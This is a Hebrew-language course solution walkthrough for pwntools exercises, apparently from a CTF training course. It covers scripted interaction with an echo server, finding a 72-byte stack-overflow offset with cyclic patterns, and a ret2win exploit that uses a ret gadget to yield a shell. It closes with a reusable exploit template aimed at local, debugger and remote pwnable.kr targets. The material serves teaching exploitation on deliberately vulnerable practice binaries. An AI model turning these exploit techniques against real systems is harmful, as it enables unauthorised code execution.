## פתרון - מבוא לpwntools

נעבור על שלושת התרגילים לפי הסדר, עם הקוד המלא, הפלט שאתם אמורים לראות, וההסבר למה כל חלק שם. בסוף יש תבנית מלאה ומוערת שתוכלו לשכפל לכל אתגר.

תזכורת על הבינאריים: הרכבנו את `echo_server` רגיל, ואת `vuln` עם `-fno-stack-protector -no-pie` כדי לכבות קנרי ו-PIE. `pwn checksec ./vuln` צריך להראות NX פעיל, Canary ו-PIE כבויים. המשמעות: כתובת `win` קבועה בין הרצות, ואין קנרי שיתפוס את הגלישה.

---

### פתרון תרגיל 1 - לדבר עם התוכנית

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

io = process('./echo_server')

io.recvuntil(b'ready')             # בולעים את שורת הפתיחה
io.sendlineafter(b'> ', b'hello')  # מחכים להנחיה ואז שולחים
answer = io.recvline_contains(b'you said')
log.success("server replied: %s", answer.decode().strip())

io.close()
```

הפלט:

```text
[+] Starting local process './echo_server': pid 12345
[+] server replied: you said: hello
```

מה קרה כאן, שלב אחר שלב:

- `process('./echo_server')` הריץ את הבינארי ופתח אליו צינור.
- `recvuntil(b'ready')` קרא ובלע את `echo server ready` כדי שלא יפריע לנו בהמשך.
- `sendlineafter(b'> ', b'hello')` המתין עד שהשרת הדפיס את ההנחיה `> `, ורק אז שלח `hello\n`. זה הסנכרון שמנע מאיתנו לשלוח מוקדם מדי.
- `recvline_contains(b'you said')` דילג על מה שלא רלוונטי והחזיר בדיוק את שורת התשובה.

למה זה עבד: הבנו שהתקשורת עם תוכנית היא ריקוד של שאלה-תשובה, ו-`sendlineafter`/`recvuntil` הם הצעדים שמסנכרנים אותנו איתה. אותו דפוס בדיוק יעבוד מול שרת מרוחק - רק נחליף `process` ב-`remote`.

טיפ: אם משהו לא הסתנכרן, הוסיפו `context.log_level = 'debug'` בראש הסקריפט ותראו hexdump של כל בית. זה הכלי הראשון לכל באג תקשורת.

### פתרון תרגיל 2 - למצוא את ה-offset עם cyclic

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./vuln', checksec=False)

io = process(exe.path)
io.recvuntil(b'data:')
io.sendline(cyclic(200))    # רצף דה-ברוין באורך 200
io.wait()                   # מחכים שהתהליך יקרוס

core = io.corefile          # pwntools מפענח את ה-core dump
rip = core.rip
log.info("crashed with RIP = %#x", rip)

offset = cyclic_find(pack(rip)[:4])   # 4 הבתים הנמוכים מזהים את ה-offset
log.success("RIP offset = %d", offset)
```

לפני ההרצה ודאו ש-core dumps מופעלים:

```bash
ulimit -c unlimited
python3 sol2.py
```

הפלט:

```text
[*] crashed with RIP = 0x61616173
[+] RIP offset = 72
```

ההסבר: שלחנו רצף cyclic של 200 בתים. הפונקציה `read` מילאה איתו את `buf[64]`, המשיכה מעבר לחוצץ, דרסה את ה-`saved rbp` (8 בתים), ואז דרסה את כתובת החזרה. כשהפונקציה ביצעה `ret`, היא קפצה לכתובת שדרסנו - ולכן `core.rip` מכיל את הבתים של רצף ה-cyclic שנחתו שם. ברגע שאנחנו יודעים איזה רצף זה, `cyclic_find` אומר לנו מאיזה offset הוא הגיע.

מפת הזיכרון של המחסנית בזמן הקריסה נראית כך:

```text
כתובות גבוהות
+----------------------------+
| כתובת חזרה - return addr   |  <-- בתים 72..79 (נדרסו, נחתו ב-RIP)
+----------------------------+
| rbp שמור - saved rbp       |  <-- בתים 64..71
+----------------------------+
| char buf[64]               |  <-- בתים 0..63
+----------------------------+
כתובות נמוכות
```

החוצץ תופס 64 בתים, ועוד 8 בתים של `saved rbp` נותנים יחד 72 - בדיוק המספר שקיבלנו. תמיד שווה לחשב את הציפייה מראש ולוודא שהכלי מסכים איתה.

למה 4 הבתים הנמוכים: כברירת מחדל `cyclic` בונה רצף שבו כל חלון של 4 בתים ייחודי. כתובת החזרה היא 8 בתים, אבל מספיק להסתכל על 4 הנמוכים כדי לזהות בוודאות מאיפה הם באו, ולכן `pack(rip)[:4]`.

אם ה-core dump לא נוצר אצלכם (קורה בחלק מהסביבות), הנה חלופה שרצה תחת GDB ולא תלויה ב-core:

```python
io = gdb.debug(exe.path, gdbscript='continue')
io.recvuntil(b'data:')
io.sendline(cyclic(200))
# התהליך קורס בתוך GDB; ב-pwndbg הריצו:  cyclic -l $rsp
```

### פתרון תרגיל 3 - לנתב את הזרימה ל-win

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./vuln', checksec=False)

io = process(exe.path)

offset = 72
ret = ROP(exe).find_gadget(['ret'])[0]   # גאדג'ט ret ליישור מחסנית

payload = flat({
    offset: [ret, exe.sym['win']],
})

io.sendlineafter(b'data:', payload)
io.interactive()
```

הריצו, וקבלו shell:

```text
[+] Starting local process './vuln': pid 13371
[*] Switching to interactive mode
congrats, flow was redirected!
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ ls
echo_server  echo_server.c  vuln  vuln.c
```

פירוק המטען, בית אחר בית:

```text
+--------------------------+
| exe.sym['win']  (8 בתים) |  offset 80  <-- לכאן נקפוץ
+--------------------------+
| ret gadget      (8 בתים) |  offset 72  <-- כתובת החזרה שנדרסת
+--------------------------+
| ריפוד cyclic    (72 בתים)|  offset 0..71
+--------------------------+
```

- `flat({72: [...]})` מילא 72 בתים של ריפוד, ואז שם את שתי הכתובות בזו אחר זו.
- ה-`ret` הבודד בעמדה 72 הוא כתובת החזרה הראשונה. הוא לא עושה כלום פרט לקפוץ הלאה, אבל בכך הוא מזיז את `rsp` ב-8 בתים ומיישר את המחסנית לגבול של 16.
- `exe.sym['win']` בעמדה 80 היא היעד האמיתי. אחרי ה-`ret` הראשון, ה-`ret` השני קופץ לתוך `win`.

למה צריך את גאדג'ט ה-`ret`: בתוך `system` יש הוראות SSE כמו `movaps` שדורשות ש-`rsp` יהיה מיושר לגבול של 16 בתים בזמן הקריאה. כשאנחנו קופצים ישר ל-`win`, היישור לרוב שבור בגלל שהוספנו כתובת אחת, והתוכנית קורסת בתוך `system` דווקא אחרי שהגענו ל-`win`. גאדג'ט `ret` בודד לפני `win` מתקן את היישור. זה תקלה נפוצה מאוד, ושווה לזכור את הפתרון - הוא יחזור לאורך כל הקורס.

למה זה עבד ואיך להכליל: שלטנו ב-RIP כי ידענו את ה-offset המדויק (72) ואת כתובת היעד הקבועה (`win`, כי הבינארי הוא no-pie). זו התבנית של ret2win, והיא הבסיס לכל מה שנבנה מכאן: החליפו את `win` בשרשרת ROP, ותקבלו ret2libc; דלפו כתובת קודם, ותעקפו PIE ו-ASLR. אותו שלד, יעדים מתוחכמים יותר.

### התבנית המלאה לשימוש חוזר

זו הגרסה שכדאי לשמור ולשכפל לכל אתגר. אותו סקריפט רץ מקומית, תחת GDB, ומול השרת - רק הארגומנט משתנה:

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./vuln', checksec=False)

host = 'pwnable.kr'
port = 9000

gdbscript = '''
b *vuln
continue
'''

def start():
    if args.REMOTE:
        return remote(host, port)
    elif args.GDB:
        return gdb.debug(exe.path, gdbscript=gdbscript)
    else:
        return process(exe.path)

io = start()

# ===== ההתקפה =====
offset = 72
ret = ROP(exe).find_gadget(['ret'])[0]

payload = flat({
    offset: [ret, exe.sym['win']],
})

io.sendlineafter(b'data:', payload)
# ===================

io.interactive()
```

הרצה בשלושת המצבים:

```bash
python3 exp.py          # מקומי - לפיתוח מהיר
python3 exp.py GDB      # מקומי תחת GDB - עוצר על vuln כדי לבחון RSP/RIP
python3 exp.py REMOTE   # מול השרת - כשהכל עובד מקומית
```

זו זרימת העבודה שנחזור עליה בכל אתגר בקורס: מפתחים ומדבגים מקומית, ומשגרים REMOTE רק כשהקריסה מדויקת. עכשיו כשהכלים באצבעות, אנחנו מוכנים לצאת לשטח ב-pwnable.kr.
